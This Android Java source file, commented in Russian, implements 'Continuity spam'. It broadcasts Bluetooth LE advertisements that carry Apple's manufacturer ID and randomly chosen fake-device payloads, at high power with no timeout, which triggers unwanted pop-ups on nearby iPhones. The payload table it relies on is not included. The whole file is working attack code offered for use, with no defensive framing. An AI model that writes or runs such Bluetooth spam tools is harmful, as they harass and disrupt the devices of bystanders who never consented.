public class ContinuitySpam {
    
    public void startSpam() {
        // Используем случайное шуточное устройство вместо фиксированного
        ContinuityDevice jokeDevice = ContinuityDevice.getRandomJokeDevice();
        
        String deviceName = jokeDevice.getName();
        String hexPayload = jokeDevice.getValue();
        
        // Логируем какое устройство запущено
        Log.d("CONTINUITY_SPAM", "🚀 Starting: " + deviceName);
        
        // Конвертируем hex строку в byte array
        byte[] payload = hexStringToByteArray(hexPayload);
        
        // Запускаем advertising
        advertiseContinuityDevice(payload, deviceName);
    }
    
    private void advertiseContinuityDevice(byte[] payload, String deviceName) {
        try {
            AdvertiseData advertiseData = new AdvertiseData.Builder()
                .setIncludeDeviceName(true)
                .setIncludeTxPowerLevel(true)
                .addManufacturerData(0x004C, payload) // Apple Manufacturer ID
                .build();
                
            AdvertiseSettings advertiseSettings = new AdvertiseSettings.Builder()
                .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
                .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
                .setConnectable(false)
                .setTimeout(0)
                .build();
                
            // Показываем уведомление
            showToast("iOS: " + deviceName);
            
            // Запускаем advertising
            bluetoothLeAdvertiser.startAdvertising(advertiseSettings, advertiseData, advertiseCallback);
            
        } catch (Exception e) {
            Log.e("CONTINUITY_SPAM", "Error starting spam: " + e.getMessage());
        }
    }
    
    // Вспомогательный метод для конвертации hex строки в byte array
    private byte[] hexStringToByteArray(String s) {
        int len = s.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
                                 + Character.digit(s.charAt(i+1), 16));
        }
        return data;
    }
    
    private void showToast(String message) {
        // Этот метод нужно реализовать в MainActivity
        // Или использовать Log для отладки
        Log.i("CONTINUITY_SPAM", message);
    }
}